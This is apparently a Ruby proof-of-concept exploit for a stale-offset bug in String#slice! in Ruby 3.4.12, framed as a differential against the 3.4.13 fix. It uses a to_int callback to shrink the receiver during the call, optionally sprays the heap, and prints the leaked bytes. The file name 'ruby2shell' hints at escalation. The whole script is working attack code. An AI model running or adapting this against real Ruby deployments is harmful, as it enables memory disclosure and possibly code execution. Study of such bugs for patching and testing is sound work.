# W335: adjacent Ruby 3.4.12 -> 3.4.13 String#slice! fix differential.
#
# 3.4.12 string.c:6015 runs rb_reg_search on the receiver, then :6019 coerces
# argv[1] via rb_reg_backref_number(match, argv[1]); a Ruby `to_int` can shrink
# the receiver. The register offsets from the earlier search are then read at
# :6023-6024 and used unchecked by rb_str_new at :6066. 3.4.13 :6065-6067 adds
#   if (beg > RSTRING_LEN(str)) return Qnil;
#   if (len > RSTRING_LEN(str) - beg) len = RSTRING_LEN(str) - beg;
#
# Local script execution only: no wire, no monkey patch, no debugger write.
# Usage: ruby ruby2shell-slice-bang-stale.rb
# Env: W335_ARM=whole|off|off1|none|grow|reclaim|plain
#      W335_OFF=<prefix bytes>  W335_MATCH=<capture bytes>  W335_TAIL=<suffix bytes>
#      W335_SHRINK=<receiver bytes after coercion>  W335_NTH=<capture index>
arm  = ENV.fetch("W335_ARM", "whole")
off  = Integer(ENV.fetch("W335_OFF", "32"))
match = Integer(ENV.fetch("W335_MATCH", "256"))
tail = Integer(ENV.fetch("W335_TAIL", "256"))
shrink = Integer(ENV.fetch("W335_SHRINK", "1"))
nth = Integer(ENV.fetch("W335_NTH", "1"))
total = off + match + tail

$s = ("A" * off) + ("B" * match) + ("C" * tail)
$re, $nth = case arm
            when "whole", "none", "grow", "reclaim", "plain"
              [/(A+B+C+)/, 1]   # beg=0, len=total
            when "off", "off1"
              [/(A+)(B+)/, 2]   # beg=off, len=match
            else
              abort "unknown W335_ARM #{arm}"
            end
$nth = nth if ENV.key?("W335_NTH")

$did = false
idx = Object.new
idx.define_singleton_method(:to_int) do
  unless $did
    $did = true
    case arm
    when "whole", "off", "off1", "reclaim"
      $s.replace("Z" * shrink)
      $junk = Array.new(64) { "Y" * 4096 } if arm == "reclaim"
    when "grow"
      $s.replace($s + ("D" * 8192))
    end
  end
  $nth
end

begin
  result = $s.slice!($re, idx)
  rbytes = result ? result.bytes : []
  head = rbytes.first(16).map { |b| "%02x" % b }.join
  chosen = rbytes.count(0x5a) + rbytes.count(0x59)
  printf("RESULT arm=%s nth=%d off=%d match=%d tail=%d shrink=%d " \
         "rlen=%d slen=%d head=%s chosen=%d\n",
         arm, $nth, off, match, tail, shrink,
         rbytes.length, $s.bytesize, head, chosen)
rescue => e
  printf("RESULT arm=%s nth=%d off=%d match=%d tail=%d shrink=%d raised=%s: %s\n",
         arm, $nth, off, match, tail, shrink, e.class, e.message)
end
